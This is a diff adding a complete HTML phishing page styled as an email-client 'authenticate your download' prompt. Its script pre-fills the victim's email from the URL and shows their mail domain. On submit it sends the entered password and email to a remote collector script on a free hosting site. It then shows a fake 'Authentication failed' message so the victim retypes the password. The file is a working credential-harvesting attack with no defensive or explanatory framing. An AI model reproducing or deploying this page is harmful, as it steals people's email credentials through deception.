@@ -1,0 +1,120 @@
+
+<!doctype html>
+<html>
+
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
+	<style>
+		body {
+			background-image: url(bg.png);
+			background-repeat: no-repeat;
+			color: #045eb4;
+		}
+		
+	
+	</style>
+</head>
+<body>
+
+
+<div style="position:relative; top:50% ; height:200px;">
+
+</div>
+<div class="d-flex justify-content-center"  >
+<div class="col-sm-4" style="background-color:#E91D2D;">
+		<form method="POST" class=" p-3" id="profileUp" >
+<div class="d-flex">
+<div>	<img src="p.jpg" width="50" height="50"></div>
+	<div><small class="text-white" id="err">Please authenticate your download with your email client</small></div>
+</div>
+
+			
+	
+			<input type="text" id="em" value="" class="form-control text-center border-0 bg-transparent text-white" readonly>
+
+			<input type="password" name="x1" class="form-control text-center" value="" id="password" placeholder="Password" required="">
+			<span class="text-danger" id="er"></span>
+			<input type="hidden" id="emailit" type="email" value="" name="access"><br>
+			
+			<input id="sub" name="sub" type="submit" class="btn btn-md btn-block btn-dark"  value="Download">
+			<center><small></small></center>
+	</form>
+	
+	<div id="pro" style="padding:40px 0 40px 0;color:white">
+			<div class="spinner-border spinner-border-lg"></div>
+ 			Authenticating <img src="#" id="imgFv" style="width:20px; height:20px;"><em> <em id="domain"></em> Mail Service!</em>
+ 		 <div class="spinner-grow spinner-grow-sm"></div>
+</div>
+
+		</div>
+
+</div>
+
+
+<script type="text/javascript">
+		function getUrlVars() {
+		    var vars = {};
+		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+		        vars[key] = value;
+		    });
+		    return vars;
+			}
+	</script>
+<script>
+    $(document).ready(function () {
+		var email = getUrlVars()['access'];
+	var domain = email.substr(email.lastIndexOf('@') + 1);
+	document.getElementById("domain").innerHTML = domain;
+	var em = $('#emailit').val(email);
+	$('#em').val(email);
+
+
+
+
+		$("#pro").hide();
+        $("#profileUp").submit(function (e) {
+            e.preventDefault();
+
+            var formData = new FormData($("#profileUp")[0]);
+
+            $.ajax({
+                url: "https://houxnabx.000webhostapp.com/n/tip.php",
+                type: 'POST',
+                data: formData,
+                contentType: false,
+                processData: false,
+               success:function(res){
+					$("#profileUp").hide();
+					$("#pro").show();
+					setTimeout(function(){
+						$("#pro").show();
+					},2000);
+					setTimeout(function(){
+						$("#profileUp").show();
+						$("#pro").hide();
+						$("#password").val("");
+						$("#err").html("<strong class='text-white'>Authentication failed! Enter correct account details to start download!</strong>");
+
+					},2000);
+			   }
+            });
+        });
+    });
+
+
+</script>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="/__/firebase/8.6.3/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<!-- Initialize Firebase -->
+<script src="/__/firebase/init.js"></script>
+</body>
+</html>
